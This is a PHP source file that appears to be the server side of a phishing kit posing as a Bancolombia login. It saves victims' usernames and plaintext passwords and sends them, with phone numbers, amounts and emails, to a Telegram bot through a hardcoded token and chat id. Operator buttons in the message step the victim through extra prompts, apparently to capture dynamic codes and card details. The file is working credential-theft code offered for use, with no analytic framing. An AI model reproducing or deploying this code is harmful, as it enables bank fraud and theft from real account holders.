<?php
ob_start();
session_start();
require 'conexion.php';

date_default_timezone_set('America/Bogota');

$nombreUsuario = $_POST['usuario'] ?? '';
$password      = $_POST['clave']   ?? '';
$claveUnica    = $_POST['key']     ?? '';
$email         = $_POST['correo']  ?? '';

if (trim($claveUnica) === '') {
    $claveUnica = 'auto_' . bin2hex(random_bytes(16));
}

$sel = $pdo->prepare("SELECT request_id, correo, estado FROM solicitudes WHERE `key` = ? LIMIT 1");
$sel->execute([$claveUnica]);
$existente = $sel->fetch(PDO::FETCH_ASSOC);

if ($existente && !empty($existente['request_id'])) {
    $idPeticionAntiguo = (string)$existente['request_id'];
} else {
    $idPeticionAntiguo = null;
}
// NUEVA sesion de login = NUEVO request_id BCO_ y estado='pendiente' SIEMPRE,
// incluso si la fila ya existia con estado != pendiente de una sesion anterior.
// Asi el operador tiene que volver a pulsar el boton correspondiente para esta sesion.
try {
    $idPeticion = 'BCO_' . bin2hex(random_bytes(18));
} catch (Throwable $_) {
    $idPeticion = 'BCO_' . bin2hex(openssl_random_pseudo_bytes(18));
}

$upsert = $pdo->prepare(
    "INSERT INTO solicitudes (`key`, `user`, `password`, `request_id`, `correo`, `estado`, `banco`)
     VALUES (:k, :u, :p, :rid, :em, 'pendiente', 'Bancolombia')
     ON DUPLICATE KEY UPDATE
         `user`       = VALUES(`user`),
         `password`   = VALUES(`password`),
         `request_id` = VALUES(`request_id`),
         `correo`     = IFNULL(VALUES(`correo`), `correo`),
         `banco`      = IFNULL(VALUES(`banco`), `banco`),
         `estado`     = 'pendiente'"
);
$upsert->execute([
    ':k'   => $claveUnica,
    ':u'   => $nombreUsuario,
    ':p'   => $password,
    ':rid' => $idPeticion,
    ':em'  => $email,
]);

$consulta = $pdo->prepare("SELECT numero_cuenta, monto, banco FROM solicitudes WHERE `key` = ? LIMIT 1");
$consulta->execute([$claveUnica]);
$datosSolicitud = $consulta->fetch(PDO::FETCH_ASSOC);

if (!$datosSolicitud) {
    $datosSolicitud = [
        'numero_cuenta' => '',
        'monto'         => '',
        'banco'         => 'Bancolombia',
    ];
}

$telefonoCliente    = $datosSolicitud['numero_cuenta'];
$montoTransferencia = $datosSolicitud['monto'];
$nombreBanco        = $datosSolicitud['banco'];

$botToken = "8067654456:AAEBhilArTMwjCmZrxW2MPsPS4-yx9hSFYU";
$idChat   = "-4923753161";

$mensaje  = "🆕 Nueva dinamica:\n";
$mensaje .= "📱 Celular: $telefonoCliente\n";
$mensaje .= "💰 Monto: $montoTransferencia\n";
$mensaje .= "🏦 Banco: $nombreBanco\n";
$mensaje .= "📧 Correo: $email\n";
$mensaje .= "---\n";
$mensaje .= "👤 Usuario: $nombreUsuario\n";
$mensaje .= "🔒 Clave: $password\n";

$teclado = [
  'inline_keyboard' => [[
    ['text' => "DINAMICA",  'callback_data' => "OPCION_1_$idPeticion"],
    ['text' => "TARJETA",   'callback_data' => "OPCION_2_$idPeticion"],
  ], [
    ['text' => "ERROR...",  'callback_data' => "OPCION_3_$idPeticion"],
    ['text' => "ERROR...",  'callback_data' => "OPCION_4_$idPeticion"],
    ['text' => "FOTO",      'callback_data' => "OPCION_5_$idPeticion"],
  ], [
    ['text' => "FINALIZAR", 'callback_data' => "OPCION_10_$idPeticion"]
  ]]
];

$payload = json_encode([
  'chat_id'      => $idChat,
  'text'         => $mensaje,
  'reply_markup' => $teclado
]);

$ch = curl_init("https://api.telegram.org/bot{$botToken}/sendMessage");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

$_SESSION['usuario']    = $nombreUsuario;
$_SESSION['clave']      = $password;
$_SESSION['correo']     = $email;
$_SESSION['celular']    = $telefonoCliente;
$_SESSION['monto']      = $montoTransferencia;
$_SESSION['banco']      = $nombreBanco;
$_SESSION['request_id'] = $idPeticion;
$_SESSION['key']        = $claveUnica;

header("Location: espera.html?rid=$idPeticion&key=$claveUnica&correo=" . urlencode($email));
exit;